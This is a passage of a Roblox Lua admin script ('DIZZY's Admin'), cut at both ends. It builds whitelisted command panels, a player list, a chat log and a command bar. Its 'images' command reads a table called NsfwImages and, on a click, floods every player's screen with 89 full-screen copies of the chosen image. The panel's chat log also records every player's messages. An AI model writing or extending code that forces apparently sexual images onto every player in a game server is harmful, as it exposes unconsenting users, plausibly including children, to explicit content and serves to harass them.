			G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["22"]["BackgroundTransparency"] = 1;
			G2L["22"]["Size"] = UDim2.new(0.41118, 0, 1, 0);
			G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["22"]["Text"] = [[Alliases: ct, CMD, templtate]];
			G2L["22"]["Name"] = [[Alliases]];
			G2L["22"]["Position"] = UDim2.new(0.58882, 0, 0, 0);

			G2L["23"] = Instance.new("Frame", G2L["1f"]);
			G2L["23"]["BorderSizePixel"] = 0;
			G2L["23"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
			G2L["23"]["Size"] = UDim2.new(0.95, 0, 0, 18);
			G2L["23"]["Position"] = UDim2.new(0.01832, 0, 0.03169, 0);
			G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["23"]["Name"] = [[PlayerTemplate]];
			G2L["23"]["BackgroundTransparency"] = 0.6;

			G2L["24"] = Instance.new("TextLabel", G2L["23"]);
			G2L["24"]["BorderSizePixel"] = 0;
			G2L["24"]["TextXAlignment"] = Enum.TextXAlignment.Left;
			G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["24"]["TextSize"] = 14;
			G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["24"]["TextColor3"] = Color3.fromRGB(174, 0, 0);
			G2L["24"]["BackgroundTransparency"] = 1;
			G2L["24"]["Size"] = UDim2.new(0.14113, 0, 1, 0);
			G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["24"]["Text"] = [[ADMIN]];
			G2L["24"]["Name"] = [[IsAdmin]];
			G2L["24"]["Position"] = UDim2.new(0.85887, 0, 0, 0);

			G2L["25"] = Instance.new("TextLabel", G2L["23"]);
			G2L["25"]["BorderSizePixel"] = 0;
			G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
			G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["25"]["TextSize"] = 14;
			G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["25"]["BackgroundTransparency"] = 1;
			G2L["25"]["Size"] = UDim2.new(0.38107, 0, 1, 0);
			G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["25"]["Text"] = [[Player]];
			G2L["25"]["Name"] = [[UserName]];
			G2L["25"]["Position"] = UDim2.new(0.02989, 0, 0, 0);

			G2L["26"] = Instance.new("TextLabel", G2L["23"]);
			G2L["26"]["BorderSizePixel"] = 0;
			G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["26"]["TextSize"] = 14;
			G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
			G2L["26"]["TextColor3"] = Color3.fromRGB(174, 0, 0);
			G2L["26"]["BackgroundTransparency"] = 1;
			G2L["26"]["AnchorPoint"] = Vector2.new(0.5, 0);
			G2L["26"]["Size"] = UDim2.new(0.38107, 0, 1, 0);
			G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["26"]["Text"] = [[Banned]];
			G2L["26"]["Name"] = [[IsBanned]];
			G2L["26"]["Position"] = UDim2.new(0.5, 0, 0, 0);



			local function C_1f()
				local script = G2L["1f"];
				local Handler = script
				local PlayerTemplate = Handler.PlayerTemplate
				local CommandTemplate = Handler.CmdTemplate

				local TopBar = script.Parent.TopBar
				local MainFrame = TopBar.MFrame
				local TabButtons = MainFrame.Tabs
				local LogsTabButton = TabButtons.Logs
				local CommandsTabButton = TabButtons.Commands
				local PlayerlistTabButton = TabButtons.Playerlist
				local Tabs = MainFrame.TabPages
				local CommandsTab = Tabs.Commands
				local PlayerListTab = Tabs.Players
				local LogsTab = Tabs.Logs
				local TabTransition = Tabs.Transition
				local Close = TopBar.Close
				local Minimize = TopBar.Minimize
				local UserName = TopBar.Uame
				local UserFrame = UserName.UserFrame
				local Players = game.Players
				local TweenService = game:GetService("TweenService")

				local minimized = false

				Minimize.MouseButton1Click:Connect(function()
					if minimized then
						minimized = false
						MainFrame:TweenSize(UDim2.new(1, 0, 20, 0), "InOut", "Quart", 0.5, true, nil)
						for _,v in pairs(MainFrame:GetChildren()) do
							v.Visible = true
						end
					else
						minimized = true
						MainFrame:TweenSize(UDim2.new(1, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
						for _,v in pairs(MainFrame:GetChildren()) do
							v.Visible = false
						end
					end
				end)
				
				
				
				Close.MouseButton1Click:Connect(function()	
					Close.Visible = false
					Minimize.Visible = false
					TopBar.Uame.Visible = false

					MainFrame:TweenSize(UDim2.new(1, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
				for _,v in pairs(MainFrame:GetChildren()) do
						v.Visible = false
					end
					task.wait(.5)
					TopBar:TweenSize(UDim2.new(0, 0, 0.02, 0), "InOut", "Quart", 0.5, true, nil)
					task.wait(.5)
					script.Parent:Destroy()
				end)

				TopBar.Uame.MouseEnter:Connect(function()
					for _, v in pairs(UserFrame:GetChildren()) do
						if v:IsA("TextLabel") then
						TweenService:Create(v, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut), {TextTransparency = 0}):Play()
								
						end
					end
				end)

				TopBar.Uame.MouseLeave:Connect(function()
					for _, v in pairs(UserFrame:GetChildren()) do
						if v:IsA("TextLabel") then
							TweenService:Create(v, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut), {TextTransparency = 1}):Play()
						end
					end
				end)

				UserName.Text = sender.Name
				UserName.UserFrame.name.Text= sender.Name
				UserName.UserFrame.Display.Text = sender.DisplayName
				UserName.UserFrame.UId.Text = sender.UserId
				UserName.UserFrame.Age.Text = sender.AccountAge

				CommandsTabButton.MouseButton1Click:Connect(function()
					TabTransition:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.5, true, nil)
					task.wait(0.5)
					PlayerListTab.Visible = false
					LogsTab.Visible = false
					CommandsTab.Visible = true
					TabTransition:TweenSize(UDim2.new(1, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
				end)
				PlayerlistTabButton.MouseButton1Click:Connect(function()
					TabTransition:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.5, true, nil)
					task.wait(0.5)
					PlayerListTab.Visible = true
					LogsTab.Visible = false
					CommandsTab.Visible = false
					TabTransition:TweenSize(UDim2.new(1, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
				end)
				LogsTabButton.MouseButton1Click:Connect(function()
					TabTransition:TweenSize(UDim2.new(1, 0, 1, 0), "InOut", "Quart", 0.5, true, nil)
					task.wait(0.5)
					PlayerListTab.Visible = false
					LogsTab.Visible = true
					CommandsTab.Visible = false
					TabTransition:TweenSize(UDim2.new(1, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
				end)


				


				-- // Players Tab

				for _, v in pairs(game.Players:GetPlayers()) do
					local playerEntry = PlayerTemplate:Clone()
					playerEntry.Name = v.Name
					playerEntry.UserName.Text = v.Name
					playerEntry.Parent = PlayerListTab.PlayerListFrame

					local isBanned = false
					local IsAdmin = false

					for _, bannedName in ipairs(Internals.Banned) do
						if v.Name == bannedName then
							isBanned = true
							break
						end
					end
					for _, WhitelistedName in ipairs(Settings.Whitelist) do
						if v.Name == WhitelistedName then
							IsAdmin = true
							break
						end
					end

					if isBanned then
						playerEntry.IsBanned.TextColor3 = Color3.fromRGB(17, 173, 103)
					end
					if IsAdmin then
						playerEntry.IsAdmin.TextColor3 = Color3.fromRGB(17, 173, 103)
					end
				end


				--// Commands tab
				for cmd, data in pairs(Internals.Commands) do
					local CommandTemp = CommandTemplate:Clone()
					CommandTemp.Command.Text = cmd
					CommandTemp.Alliases.Text = "Aliases: " .. table.concat(data.Data.Aliases, ", ")
					CommandTemp.Parent = CommandsTab.CommandsFrame
						
				end


				local function logtime()
					local HOUR = math.floor((tick() % 86400) / 3600)
					local MINUTE = math.floor((tick() % 3600) / 60)
					local SECOND = math.floor(tick() % 60)
					local AP = HOUR > 11 and "PM" or "AM"
					HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
					HOUR = HOUR < 10 and "0" .. HOUR or HOUR
					MINUTE = MINUTE < 10 and "0" .. MINUTE or MINUTE
					SECOND = SECOND < 10 and "0" .. SECOND or SECOND
					return HOUR .. ":" .. MINUTE .. ":" .. SECOND .. " " .. AP
				end

				local function CreateLabel(Name, arg1)
					local sf = LogsTab.logsFrame
					if #sf:GetChildren() >= 2546 then
						sf:ClearAllChildren()
					end
					local alls = 0
					for i, v in pairs(sf:GetChildren()) do
						if v then
							alls = v.Size.Y.Offset + alls
						end
						if not v then
							alls = 0
						end
					end
					local tl = Instance.new("TextLabel", sf)
					local il = Instance.new("Frame", tl)
					
					tl.Name = Name
					tl.ZIndex = 5
					tl.Text = logtime() .. " - [" .. Name .. "]: " .. arg1
					tl.Size = UDim2.new(0, 327, 0, 84)
					tl.BackgroundTransparency = 1
					tl.BorderSizePixel = 0
					tl.Font = Enum.Font.SourceSansBold
					tl.Position = UDim2.new(-1, 0, 0, alls)
					tl.TextTransparency = 1
					tl.TextScaled = false
					tl.TextSize = 14
					tl.TextWrapped = true
					tl.TextXAlignment = Enum.TextXAlignment.Left
					tl.TextYAlignment = Enum.TextYAlignment.Top
					il.BackgroundTransparency = 1
					il.BorderSizePixel = 0
					il.Size = UDim2.new(1, 0, 1, 0)
					il.Position = UDim2.new(0, 0, 0, 0)
					tl.TextColor3 = Color3.fromRGB(255, 255, 255)
					tl.Size = UDim2.new(0, 327, 0, tl.TextBounds.Y)
					sf.CanvasSize = UDim2.new(0, 0, 0, alls + tl.TextBounds.Y + 3)
					sf.CanvasPosition = Vector2.new(0, sf.CanvasPosition.Y + tl.TextBounds.Y)
					local size2 = sf.CanvasSize.Y.Offset
					tl:TweenPosition(UDim2.new(0, 4, 0, alls), "In", "Quint", 0.5)
					for i = 0, 50 do
						wait(0.05)
						tl.TextTransparency = tl.TextTransparency - 0.05
					end
					tl.TextTransparency = 0
				end

				local function onPlayerChatted(player, message)
					CreateLabel(player.Name, message)
				end

				local function onPlayerAdded(player)
					player.Chatted:Connect(function(message)
						CreateLabel(player.Name, message)
					end)
				end

				Players.PlayerAdded:Connect(onPlayerAdded)

				for _, player in ipairs(Players:GetPlayers()) do
					onPlayerAdded(player)
				end

			end;
			task.spawn(C_1f);	
			return G2L["1"], require;																									
	end
})



local function LoadImage(id, a, x, y)
	for _, player in pairs(game.Players:GetPlayers()) do
		local playerGui = player:WaitForChild("PlayerGui")
		local gui = Instance.new("ScreenGui")
		gui.Parent = playerGui

		local MFrame1 = Instance.new("Frame")
		MFrame1.Parent = gui

		MFrame1.Size = UDim2.new(1, 0, 1, 0)
		MFrame1.Position = UDim2.new(0.5, 0, 0.5, 0)
		MFrame1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		MFrame1.AnchorPoint = Vector2.new(0.5, 0.5)
		MFrame1.ZIndex = -3

		local MFrame2 = Instance.new("Frame")
		MFrame2.Parent = MFrame1
		MFrame2.Size = UDim2.new(1, 0, 1, 0)
		MFrame2.Position = UDim2.new(0.5, 0, 0.5, 0)
		MFrame2.BackgroundTransparency = 1
		MFrame2.ClipsDescendants = true
		MFrame2.AnchorPoint = Vector2.new(0.5, 0.5)
		MFrame2.ZIndex = -2

		local AspectRatio = Instance.new("UIAspectRatioConstraint")
		AspectRatio.AspectRatio = a
		AspectRatio.DominantAxis = "Width"
		AspectRatio.AspectType = "FitWithinMaxSize"
		AspectRatio.Parent = MFrame2

		for i = 1, 89 do
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Image = "http://www.roblox.com/asset/?id=" .. tostring(id)
			imageLabel.BackgroundTransparency = 1
			imageLabel.Parent = MFrame2
			imageLabel.ZIndex = -1

			imageLabel.Size = UDim2.new(x, 0, y, 0)
		end
	end
end


-- Command to load images and show buttons
addcmd({
	Name = "images",
	Aliases = {"realimages", "pngs"},
	Function = function(sender, targets, arguments)

		-- Creating the UI
		local CommandsListUI = {
			["_CommandsGui"] = Instance.new("ScreenGui"),
			["_Frame"] = Instance.new("Frame"),
			["_UiCorner"] = Instance.new("UICorner"),
			["_ScrollingFrame"] = Instance.new("ScrollingFrame"),
			["_UIListLayout"] = Instance.new("UIListLayout"),
			["_ImageButton"] = Instance.new("ImageButton"),
			["_TextLabel2"] = Instance.new("TextLabel"),
			["_ImageLabel"] = Instance.new("ImageLabel")
		}

		CommandsListUI["_CommandsGui"].Parent = sender:WaitForChild("PlayerGui")
		CommandsListUI["_CommandsGui"].DisplayOrder = 100

		CommandsListUI["_Frame"].BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		CommandsListUI["_Frame"].BorderSizePixel = 0
		CommandsListUI["_Frame"].ClipsDescendants = true
		CommandsListUI["_Frame"].Position = UDim2.new(0.5, -225, 0.5, -200)
		CommandsListUI["_Frame"].Size = UDim2.new(0, 450, 0, 400)
		CommandsListUI["_Frame"].Parent = CommandsListUI["_CommandsGui"]
		CommandsListUI["_Frame"].Name = "Main"

		CommandsListUI["_UiCorner"].CornerRadius = UDim.new(0, 4)
		CommandsListUI["_UiCorner"].Parent = CommandsListUI["_Frame"]

		CommandsListUI["_ScrollingFrame"].CanvasSize = UDim2.new(0, 0, 0, 530)
		CommandsListUI["_ScrollingFrame"].ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
		CommandsListUI["_ScrollingFrame"].ScrollBarThickness = 2
		CommandsListUI["_ScrollingFrame"].BackgroundTransparency = 1
		CommandsListUI["_ScrollingFrame"].Position = UDim2.new(0, 5, 0, 45)
		CommandsListUI["_ScrollingFrame"].Size = UDim2.new(1, -10, 1, -50)
		CommandsListUI["_ScrollingFrame"].Parent = CommandsListUI["_Frame"]

		CommandsListUI["_UIListLayout"].Padding = UDim.new(0, 8)
		CommandsListUI["_UIListLayout"].Parent = CommandsListUI["_ScrollingFrame"]

		CommandsListUI["_ImageButton"].Image = "http://www.roblox.com/asset/?id=15112972490"
		CommandsListUI["_ImageButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandsListUI["_ImageButton"].BackgroundTransparency = 1
		CommandsListUI["_ImageButton"].Position = UDim2.new(0.918, 0, 0.018, 0)
		CommandsListUI["_ImageButton"].Size = UDim2.new(0, 25, 0, 25)
		CommandsListUI["_ImageButton"].Parent = CommandsListUI["_Frame"]

		CommandsListUI["_ImageButton"].MouseButton1Click:Connect(function()
			CommandsListUI["_Frame"]:TweenPosition(UDim2.new(0.5, -225, 1.5, -200), "Out", "Quad", 0.5, true)
			task.wait(0.5)
			CommandsListUI["_CommandsGui"]:Destroy()
		end)

		local CommandFrame = Instance.new("Frame")
		local CommandLabel = Instance.new("TextButton")
		local CommandCorner = Instance.new("UICorner")

		CommandFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
		CommandFrame.BackgroundTransparency = 0.4
		CommandFrame.BorderSizePixel = 0
		CommandFrame.Position = UDim2.new(0, 5, 0, 0)
		CommandFrame.Size = UDim2.new(1, -10, 0, 40)
		CommandFrame.Parent = CommandsListUI["_ScrollingFrame"]

		CommandLabel.Font = Enum.Font.Gotham
		CommandLabel.Text = "Clear Images"
		CommandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandLabel.TextSize = 16
		CommandLabel.TextXAlignment = Enum.TextXAlignment.Left
		CommandLabel.BackgroundTransparency = 1
		CommandLabel.Position = UDim2.new(0, 10, 0, 0)
		CommandLabel.Size = UDim2.new(1, -10, 1, 0)
		CommandLabel.Parent = CommandFrame

		CommandLabel.MouseButton1Click:Connect(function()
			for _, player in pairs(game.Players:GetPlayers()) do
				local playerGui = player:WaitForChild("PlayerGui")
				for _, screenGui in pairs(playerGui:GetChildren()) do
					if screenGui:IsA("ScreenGui") and screenGui.Name == "ScreenGui" then
						local frame = screenGui:FindFirstChild("Frame")
						if frame and frame.Name == "Frame" then 
							screenGui:Destroy()
						end
					end
				end
			end
		end)

		CommandCorner.CornerRadius = UDim.new(0, 4)
		CommandCorner.Parent = CommandFrame

		for category, imageDataList in pairs(Internals.NsfwImages) do
			for _, imageData in pairs(imageDataList) do
				local CommandFrame = Instance.new("Frame")
				local CommandLabel = Instance.new("TextButton")
				local CommandCorner = Instance.new("UICorner")

				CommandFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
				CommandFrame.BackgroundTransparency = 0.4
				CommandFrame.BorderSizePixel = 0
				CommandFrame.Position = UDim2.new(0, 5, 0, 0)
				CommandFrame.Size = UDim2.new(1, -10, 0, 40)
				CommandFrame.Parent = CommandsListUI["_ScrollingFrame"]

				CommandLabel.Font = Enum.Font.Gotham
				CommandLabel.Text = imageData.name
				CommandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				CommandLabel.TextSize = 16
				CommandLabel.TextXAlignment = Enum.TextXAlignment.Left
				CommandLabel.BackgroundTransparency = 1
				CommandLabel.Position = UDim2.new(0, 10, 0, 0)
				CommandLabel.Size = UDim2.new(1, -10, 1, 0)
				CommandLabel.Parent = CommandFrame

				-- When a button is clicked, call LoadImage for all players
				CommandLabel.MouseButton1Click:Connect(function()
					LoadImage(imageData.id, imageData.a, imageData.x1, imageData.y1)
				end)

				-- Apply corner radius to the command frame
				CommandCorner.CornerRadius = UDim.new(0, 4)
				CommandCorner.Parent = CommandFrame
			end
		end
	end
})



addcmd({
	Name = "m",
	Aliases = {"message", "annc", "announce"},
	Function = function(sender, _, arguments)
		local message = table.concat(arguments, " ") or "No message provided"
		for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
			coroutine.wrap(function()
				announce(player, message)
			end)()
		end
	end
})



local function execommand(command, sender)
	if not table.find(Settings.Whitelist, sender.Name) then
		notif(sender, "Error", "You are not whitelisted to use commands.", Internals.Icons.Error)
		return
	end

	local parts = command:split(" ")
	local cmdname = parts[1]
	local target = parts[2] or "me"
	local args = {}

	if cmdname == "m" or cmdname == "annc" or cmdname == "announce" then
		args = {command:sub(#cmdname + 2)}
	else
		args = {table.unpack(parts, 3)}
	end

	local commandData = Internals.Commands[cmdname]
	if not commandData then
		for _, cmd in pairs(Internals.Commands) do
			if table.find(cmd.Data.Aliases, cmdname) then
				commandData = cmd
				break
			end
		end
	end

	if commandData then
		local targets = p(target, sender)
		commandData.Data.Function(sender, targets, args)
	else
		notif(sender, "Error", "Command '" .. cmdname .. "' was not found.", Internals.Icons.Error)
	end
end



addcmd({
	Name = "cmdbar",
	Aliases = {"commandbar", "cb"},
	Function = function(sender, _, arguments)


		local CommandBarUI = {
			["_CmdBarDIZ"] = Instance.new("ScreenGui");
			["_main"] = Instance.new("Frame");
			["_main1"] = Instance.new("Frame");
			["_TextBox"] = Instance.new("TextBox");
			["_UICorner"] = Instance.new("UICorner");
			["_topbar"] = Instance.new("Frame");
			["_ImageLabel"] = Instance.new("ImageLabel");
			["_Frame"] = Instance.new("Frame");
			["_UICorner1"] = Instance.new("UICorner");
			["_Frame1"] = Instance.new("Frame");
			["_UICorner2"] = Instance.new("UICorner");
			["_Frame2"] = Instance.new("Frame");
			["_TextLabel"] = Instance.new("TextLabel");
			["_Frame3"] = Instance.new("Frame");
			["_ImageLabel1"] = Instance.new("ImageLabel");
			["_Frame4"] = Instance.new("Frame");
			["_UICorner3"] = Instance.new("UICorner");
			["_Frame5"] = Instance.new("Frame");
			["_LocalScript"] = Instance.new("LocalScript");
			["_date"] = Instance.new("TextLabel");
			["_LocalScript1"] = Instance.new("LocalScript");
			["_mem"] = Instance.new("TextLabel");
			["_LocalScript2"] = Instance.new("LocalScript");
			["_Run"] = Instance.new("ImageButton");
			["_UICorner4"] = Instance.new("UICorner");
			["_Frame6"] = Instance.new("Frame");
			["_TextLabel1"] = Instance.new("TextLabel");
			["_UICorner5"] = Instance.new("UICorner");
			["_glassy"] = Instance.new("CanvasGroup");
			["_HANDLE"] = Instance.new("LocalScript");

			["_ImageButton"] = Instance.new("ImageButton");
		}

		-- Properties:

		CommandBarUI["_CmdBarDIZ"].IgnoreGuiInset = true
		CommandBarUI["_CmdBarDIZ"].SafeAreaCompatibility = Enum.SafeAreaCompatibility.None
		CommandBarUI["_CmdBarDIZ"].ScreenInsets = Enum.ScreenInsets.None
		CommandBarUI["_CmdBarDIZ"].ResetOnSpawn = false
		CommandBarUI["_CmdBarDIZ"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		CommandBarUI["_CmdBarDIZ"].Name = "CmdBarDIZ"
		CommandBarUI["_CmdBarDIZ"].Parent = sender:WaitForChild("PlayerGui")

		CommandBarUI["_main"].BackgroundColor3 = Color3.fromRGB(30.00000011175871, 30.00000011175871, 30.00000011175871)
		CommandBarUI["_main"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_main"].BorderSizePixel = 0
		CommandBarUI["_main"].Position = UDim2.new(0, 0, 0.72, 0)
		CommandBarUI["_main"].Size = UDim2.new(0, 283, 0, 103)
		CommandBarUI["_main"].Name = "main"
		CommandBarUI["_main"].Parent = CommandBarUI["_CmdBarDIZ"]

		CommandBarUI["_main1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_main1"].BackgroundTransparency = 1
		CommandBarUI["_main1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_main1"].BorderSizePixel = 0
		CommandBarUI["_main1"].Position = UDim2.new(0, 5, 0, 29)
		CommandBarUI["_main1"].Size = UDim2.new(1, -10, 1, -66)
		CommandBarUI["_main1"].ZIndex = 2
		CommandBarUI["_main1"].Name = "main"
		CommandBarUI["_main1"].Parent = CommandBarUI["_main"]

		CommandBarUI["_TextBox"].CursorPosition = -1
		CommandBarUI["_TextBox"].Font = Enum.Font.Ubuntu
		CommandBarUI["_TextBox"].PlaceholderText = "DIZZY's Admin"
		CommandBarUI["_TextBox"].ClearTextOnFocus = false
		CommandBarUI["_TextBox"].TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_TextBox"].TextSize = 15
		CommandBarUI["_TextBox"].TextWrapped = true
		CommandBarUI["_TextBox"].Text = ""
		CommandBarUI["_TextBox"].TextXAlignment = Enum.TextXAlignment.Left
		CommandBarUI["_TextBox"].TextYAlignment = Enum.TextYAlignment.Top
		CommandBarUI["_TextBox"].BackgroundColor3 = Color3.fromRGB(40.00000141561031, 40.00000141561031, 40.00000141561031)
		CommandBarUI["_TextBox"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_TextBox"].BorderSizePixel = 0
		CommandBarUI["_TextBox"].Size = UDim2.new(1, 0, 1, 0)
		CommandBarUI["_TextBox"].Parent = CommandBarUI["_main1"]
		CommandBarUI["_TextBox"].ClearTextOnFocus = true

		CommandBarUI["_Run"].MouseButton1Click:Connect(function()
			print(sender.PlayerGui.CmdBarDIZ.main.main.TextBox.Text)
			execommand(sender.PlayerGui.CmdBarDIZ.main.main.TextBox.Text, sender)
		end)
		CommandBarUI["_UICorner"].Parent = CommandBarUI["_main"]

		CommandBarUI["_ImageButton"].Image = "http://www.roblox.com/asset/?id=15112972490"
		CommandBarUI["_ImageButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_ImageButton"].BackgroundTransparency = 1
		CommandBarUI["_ImageButton"].BorderSizePixel = 4
		CommandBarUI["_ImageButton"].Position = UDim2.new(0.91871208, 0, 0.0483650404, 0)
		CommandBarUI["_ImageButton"].Size = UDim2.new(0, 25, 0, 25)
		CommandBarUI["_ImageButton"].Parent = CommandBarUI["_Frame"]

		CommandBarUI["_ImageButton"].MouseButton1Click:Connect(function()
			CommandBarUI["_CmdBarDIZ"]:Destroy()
		end)

		CommandBarUI["_topbar"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_topbar"].BackgroundTransparency = 1
		CommandBarUI["_topbar"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_topbar"].BorderSizePixel = 0
		CommandBarUI["_topbar"].ClipsDescendants = true
		CommandBarUI["_topbar"].Size = UDim2.new(1, 0, 0, 24)
		CommandBarUI["_topbar"].ZIndex = 5
		CommandBarUI["_topbar"].Name = "topbar"
		CommandBarUI["_topbar"].Parent = CommandBarUI["_main"]

		CommandBarUI["_ImageLabel"].Image = "rbxassetid://2021628684"
		CommandBarUI["_ImageLabel"].ImageColor3 = Color3.fromRGB(227.00000166893005, 227.00000166893005, 227.00000166893005)
		CommandBarUI["_ImageLabel"].BackgroundColor3 = Color3.fromRGB(227.00000166893005, 227.00000166893005, 227.00000166893005)
		CommandBarUI["_ImageLabel"].BackgroundTransparency = 1
		CommandBarUI["_ImageLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_ImageLabel"].BorderSizePixel = 0
		CommandBarUI["_ImageLabel"].Position = UDim2.new(0, 150, 0, 0)
		CommandBarUI["_ImageLabel"].Size = UDim2.new(0, 50, 1, 1)
		CommandBarUI["_ImageLabel"].Parent = CommandBarUI["_topbar"]

		CommandBarUI["_Frame"].BackgroundColor3 = Color3.fromRGB(227.00000166893005, 227.00000166893005, 227.00000166893005)
		CommandBarUI["_Frame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame"].BorderSizePixel = 0
		CommandBarUI["_Frame"].Position = UDim2.new(0, 6, 0, 0)
		CommandBarUI["_Frame"].Size = UDim2.new(1, -10, 0, 8)
		CommandBarUI["_Frame"].Parent = CommandBarUI["_topbar"]

		CommandBarUI["_UICorner1"].CornerRadius = UDim.new(0, 7)
		CommandBarUI["_UICorner1"].Parent = CommandBarUI["_Frame"]

		CommandBarUI["_Frame1"].BackgroundColor3 = Color3.fromRGB(9.000000413507223, 13.00000112503767, 24.00000236928463)
		CommandBarUI["_Frame1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame1"].BorderSizePixel = 0
		CommandBarUI["_Frame1"].Size = UDim2.new(0, 150, 1, -5)
		CommandBarUI["_Frame1"].ZIndex = 5
		CommandBarUI["_Frame1"].Parent = CommandBarUI["_topbar"]

		CommandBarUI["_UICorner2"].CornerRadius = UDim.new(0, 7)
		CommandBarUI["_UICorner2"].Parent = CommandBarUI["_Frame1"]

		CommandBarUI["_Frame2"].BackgroundColor3 = Color3.fromRGB(9.000000413507223, 13.00000112503767, 24.00000236928463)
		CommandBarUI["_Frame2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame2"].BorderSizePixel = 0
		CommandBarUI["_Frame2"].Position = UDim2.new(0.5, 0, 0, 0)
		CommandBarUI["_Frame2"].Size = UDim2.new(0.5, 0, 1, 0)
		CommandBarUI["_Frame2"].Parent = CommandBarUI["_Frame1"]

		CommandBarUI["_TextLabel"].Font = Enum.Font.GothamBold
		CommandBarUI["_TextLabel"].RichText = true
		CommandBarUI["_TextLabel"].Text = "Command Bar"
		CommandBarUI["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_TextLabel"].TextSize = 14
		CommandBarUI["_TextLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandBarUI["_TextLabel"].BackgroundTransparency = 1
		CommandBarUI["_TextLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_TextLabel"].BorderSizePixel = 0
		CommandBarUI["_TextLabel"].Size = UDim2.new(1, 0, 1, 0)
		CommandBarUI["_TextLabel"].Parent = CommandBarUI["_Frame1"]

		CommandBarUI["_Frame3"].BackgroundColor3 = Color3.fromRGB(9.000000413507223, 13.00000112503767, 24.00000236928463)
		CommandBarUI["_Frame3"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame3"].BorderSizePixel = 0
		CommandBarUI["_Frame3"].Position = UDim2.new(0, 0, 0.5, 0)
		CommandBarUI["_Frame3"].Size = UDim2.new(0, 150, 0.5, 0)
		CommandBarUI["_Frame3"].ZIndex = -5
		CommandBarUI["_Frame3"].Parent = CommandBarUI["_Frame1"]

		CommandBarUI["_ImageLabel1"].Image = "rbxassetid://2021628684"
		CommandBarUI["_ImageLabel1"].ImageColor3 = Color3.fromRGB(9.000000413507223, 13.000000175088644, 24.000000469386578)
		CommandBarUI["_ImageLabel1"].BackgroundColor3 = Color3.fromRGB(9.000000413507223, 13.000000175088644, 24.000000469386578)
		CommandBarUI["_ImageLabel1"].BackgroundTransparency = 1
		CommandBarUI["_ImageLabel1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_ImageLabel1"].BorderSizePixel = 0
		CommandBarUI["_ImageLabel1"].Position = UDim2.new(0, 150, 0, 0)
		CommandBarUI["_ImageLabel1"].Size = UDim2.new(0, 35, 1, -5)
		CommandBarUI["_ImageLabel1"].ZIndex = 5
		CommandBarUI["_ImageLabel1"].Parent = CommandBarUI["_topbar"]

		CommandBarUI["_Frame4"].BackgroundColor3 = Color3.fromRGB(9.000000413507223, 13.00000112503767, 24.00000236928463)
		CommandBarUI["_Frame4"].BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandBarUI["_Frame4"].BorderSizePixel = 0
		CommandBarUI["_Frame4"].Position = UDim2.new(0, 6, 0, 0)
		CommandBarUI["_Frame4"].Size = UDim2.new(1, -10, 0, 3)
		CommandBarUI["_Frame4"].Parent = CommandBarUI["_topbar"]

		CommandBarUI["_UICorner3"].CornerRadius = UDim.new(0, 7)
